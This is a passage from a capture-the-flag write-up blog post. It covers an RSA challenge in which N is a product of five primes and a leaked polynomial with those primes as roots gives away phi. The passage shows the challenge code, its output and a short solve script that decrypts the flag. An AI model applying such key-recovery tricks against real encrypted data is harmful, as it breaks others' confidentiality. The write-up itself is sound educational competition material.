e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span> \ne = <span class="subst">&#123;e&#125;</span> \nc = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">coefficients = P.polyfromroots(primes)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Although I am evil, I&#x27;ll give you a hint&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="string">f&quot;The polynomial is: (<span class="subst">&#123;coefficients[<span class="number">5</span>]&#125;</span>) * x ** 5 + (<span class="subst">&#123;coefficients[<span class="number">4</span>]&#125;</span>) * x ** 4 + (<span class="subst">&#123;coefficients[<span class="number">3</span>]&#125;</span>) * x ** 3 + (<span class="subst">&#123;coefficients[<span class="number">2</span>]&#125;</span>) * x ** 2 + (<span class="subst">&#123;coefficients[<span class="number">1</span>]&#125;</span>) * x + <span class="subst">&#123;coefficients[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;There is no formula for solving polynomial of degree 5, haha! Good luck. - Yona&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        x**<span class="number">5</span> * coefficients[<span class="number">5</span>]</span><br><span class="line">        + x**<span class="number">4</span> * coefficients[<span class="number">4</span>]</span><br><span class="line">        + x**<span class="number">3</span> * coefficients[<span class="number">3</span>]</span><br><span class="line">        + x**<span class="number">2</span> * coefficients[<span class="number">2</span>]</span><br><span class="line">        + x * coefficients[<span class="number">1</span>]</span><br><span class="line">        + coefficients[<span class="number">0</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> primes:</span><br><span class="line">    <span class="keyword">assert</span> (</span><br><span class="line">        test(i) == <span class="number">0</span></span><br><span class="line">    )  <span class="comment"># Sanity check: f(primes[0])=f(primes[1])=f(primes[2])=f(primes[3])=f(primes[4])=0</span></span><br></pre></td></tr></table></figure>
+<p>datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N = 74589377388479220256395124274755513621718001102938856092310626864216100145712997319914585852060516860124385965515331225191123640248815762375637061146158019710356354182927130436015567384589212130141604217421596634528636808019529188666442648153861134305235629996965542430142123282353328395170876196825775920311489204406316187516031426539335287082312293247953584850084586734086698849529182812144565314967419394593384813521249211428140352535373332471130679778470381067853395230164047935419526274875409265972962207414724607294335787238466834759816597980106867778766429397286635717142518810137545341313002078785183519807611849582375914565184651868791970435568273838266325138228060847909410186134993056874695784606042850167617165347780472076237226645613353060515144044347183509</span><br><span class="line">e = 65537</span><br><span class="line">c = 54372310422162708341909396227965961183075164626326017773456004764517207663829886720623601526357940251610660533163860948135456347826467002370324727678431322843031819718926459976753216927837967564953040402801257157084240349840883660989458820207012640721444852382837830533899879003788144950945681915970342254477344117298735514768937873088362985771838877041100278220389071111435319778351229795816490844209035434932113804441265743033999566002298838065894108562631005641425579848020654904227888485997533351392857727661036462725934031024681823937663271763906242364330796951143526976524873317993082339057106782776240418315046104198751660443814428478898635416762507143880424277125109381932855364490688177651782201815223200292490592250478205144562150126028403166082872900689137986</span><br><span class="line">Although I am evil, I&#x27;ll give you a hint</span><br><span class="line">The polynomial is: (1) * x ** 5 + (-48119449238959664064431388056848262083443351598010876486005413980899245102862943274432647312446266822103926556526300888806856941814195140033426532726966437) * x ** 4 + (916316390865283052868626470361843430815918523848362242777583162414894410696655556195550888998755174145739138567507614480869166751184302565410999041546991684138302351523261989111053193108570521027783948023551076049920890841240287983163459408048895095207456456247472660472441658241455701549473898214907795655566) * x ** 3 + (-8636441083905369069858042281233210939562373326826279452527134344325437120207426211765124178977354188033445775815868821763452710446707060837775101016795669592871763575334601044113835411901379743007595478612376693938561710975476581723590556220834011539105796136301231814195401206505414231054318174488622722611340281691158586557161782841515451050936630513236286511377050950331199002595328681947245303725234202732723544835902211707232831601361506113973845429026225606) * x ** 2 + (40312004179206688223872932025775480226076597343501861181532840272255094576634732415718100509136108879304510567702820703769197754909358459712403222683623066785661752598760763311650855902676830718134590209890586323292552227718091854684669628811126859486800060644183161968857476110122249234590895222131484100414587817486822592070046579831077159138144024860101119755482238856711941887533623456728755956754709985164455397940606771505768608528432853163841570748594353864364499997324136790864192493779011411411989999335219283264251298131077179324522557444743603629333420644593175780239045402537439673048420430564984413432945) * x + -74589377388479220256395124274755513621718001102938856092310626864216100145712997319914585852060516860124385965515331225191123640248815762375637061146158019710356354182927130436015567384589212130141604217421596634528636808019529188666442648153861134305235629996965542430142123282353328395170876196825775920311489204406316187516031426539335287082312293247953584850084586734086698849529182812144565314967419394593384813521249211428140352535373332471130679778470381067853395230164047935419526274875409265972962207414724607294335787238466834759816597980106867778766429397286635717142518810137545341313002078785183519807611849582375914565184651868791970435568273838266325138228060847909410186134993056874695784606042850167617165347780472076237226645613353060515144044347183509</span><br><span class="line">There is no formula for solving polynomial of degree 5, haha! Good luck. - Yona</span><br></pre></td></tr></table></figure>
+<p>solve script:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">     <span class="keyword">return</span>((<span class="number">1</span>) * x ** <span class="number">5</span> + (-<span class="number">48119449238959664064431388056848262083443351598010876486005413980899245102862943274432647312446266822103926556526300888806856941814195140033426532726966437</span>) * x ** <span class="number">4</span> + (<span class="number">916316390865283052868626470361843430815918523848362242777583162414894410696655556195550888998755174145739138567507614480869166751184302565410999041546991684138302351523261989111053193108570521027783948023551076049920890841240287983163459408048895095207456456247472660472441658241455701549473898214907795655566</span>) * x ** <span class="number">3</span> + (-<span class="number">8636441083905369069858042281233210939562373326826279452527134344325437120207426211765124178977354188033445775815868821763452710446707060837775101016795669592871763575334601044113835411901379743007595478612376693938561710975476581723590556220834011539105796136301231814195401206505414231054318174488622722611340281691158586557161782841515451050936630513236286511377050950331199002595328681947245303725234202732723544835902211707232831601361506113973845429026225606</span>) * x ** <span class="number">2</span> + (<span class="number">40312004179206688223872932025775480226076597343501861181532840272255094576634732415718100509136108879304510567702820703769197754909358459712403222683623066785661752598760763311650855902676830718134590209890586323292552227718091854684669628811126859486800060644183161968857476110122249234590895222131484100414587817486822592070046579831077159138144024860101119755482238856711941887533623456728755956754709985164455397940606771505768608528432853163841570748594353864364499997324136790864192493779011411411989999335219283264251298131077179324522557444743603629333420644593175780239045402537439673048420430564984413432945</span>) * x + -<span class="number">74589377388479220256395124274755513621718001102938856092310626864216100145712997319914585852060516860124385965515331225191123640248815762375637061146158019710356354182927130436015567384589212130141604217421596634528636808019529188666442648153861134305235629996965542430142123282353328395170876196825775920311489204406316187516031426539335287082312293247953584850084586734086698849529182812144565314967419394593384813521249211428140352535373332471130679778470381067853395230164047935419526274875409265972962207414724607294335787238466834759816597980106867778766429397286635717142518810137545341313002078785183519807611849582375914565184651868791970435568273838266325138228060847909410186134993056874695784606042850167617165347780472076237226645613353060515144044347183509</span>)</span><br><span class="line">phi=-<span class="number">1</span>*f(<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">54372310422162708341909396227965961183075164626326017773456004764517207663829886720623601526357940251610660533163860948135456347826467002370324727678431322843031819718926459976753216927837967564953040402801257157084240349840883660989458820207012640721444852382837830533899879003788144950945681915970342254477344117298735514768937873088362985771838877041100278220389071111435319778351229795816490844209035434932113804441265743033999566002298838065894108562631005641425579848020654904227888485997533351392857727661036462725934031024681823937663271763906242364330796951143526976524873317993082339057106782776240418315046104198751660443814428478898635416762507143880424277125109381932855364490688177651782201815223200292490592250478205144562150126028403166082872900689137986</span></span><br><span class="line">n=<span class="number">74589377388479220256395124274755513621718001102938856092310626864216100145712997319914585852060516860124385965515331225191123640248815762375637061146158019710356354182927130436015567384589212130141604217421596634528636808019529188666442648153861134305235629996965542430142123282353328395170876196825775920311489204406316187516031426539335287082312293247953584850084586734086698849529182812144565314967419394593384813521249211428140352535373332471130679778470381067853395230164047935419526274875409265972962207414724607294335787238466834759816597980106867778766429397286635717142518810137545341313002078785183519807611849582375914565184651868791970435568273838266325138228060847909410186134993056874695784606042850167617165347780472076237226645613353060515144044347183509</span></span><br><span class="line">d=inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preview-Card"><span class="toc-number">2.1.</span> <span class="toc-text">Preview Card</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2"><span class="toc-number">2.2.</span> <span class="toc-text">Jinja2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cat"><span class="toc-number">2.3.</span> <span class="toc-text">Cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yet-Another-Username-Password-Checker"><span class="toc-number">2.4.</span> <span class="toc-text">Yet Another Username Password Checker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">2.5.</span> <span class="toc-text">bof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#puRely-high-School-mAth"><span class="toc-number">2.6.</span> <span class="toc-text">puRely high School mAth</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/09/23/NCKUCTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/09/23/NCKUCTF/&text=NCKUCTF Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/09/23/NCKUCTF/&is_video=false&description=NCKUCTF Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NCKUCTF Write Up&body=Check out this article: http://wha13.github.io/2023/09/23/NCKUCTF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/09/23/NCKUCTF/&name=NCKUCTF Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/09/23/NCKUCTF/&t=NCKUCTF Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
